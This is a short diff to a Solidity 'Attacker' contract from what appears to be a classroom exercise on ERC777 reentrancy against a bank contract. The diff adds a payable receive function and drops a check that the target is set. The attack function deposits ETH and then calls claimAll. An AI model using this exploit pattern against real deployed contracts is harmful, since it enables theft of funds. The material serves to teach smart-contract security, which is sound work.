@@ -24,6 +24,8 @@ contract Attacker is AccessControl, IERC777Recipient {
 		_erc1820.setInterfaceImplementer(address(this),TOKENS_RECIPIENT_INTERFACE_HASH,address(this)); //In order to receive ERC777 (like the MCITR tokens used in the attack) you must register with the EIP1820 Registry
     }
 
+	receive() external payable {}
+
 	function setTarget(address bank_address) external onlyRole(ATTACKER_ROLE) {
 		bank = Bank(bank_address);
         _grantRole(ATTACKER_ROLE, address(this));
@@ -35,7 +37,6 @@ contract Attacker is AccessControl, IERC777Recipient {
 	   amt is the amt of ETH the attacker will deposit initially to start the attack
 	*/
 	function attack(uint256 amt) payable public {
-      require( address(bank) != address(0), "Target bank not set" );
 		//YOUR CODE TO START ATTACK GOES HERE
         bank.deposit{value: msg.value}();
         bank.claimAll();
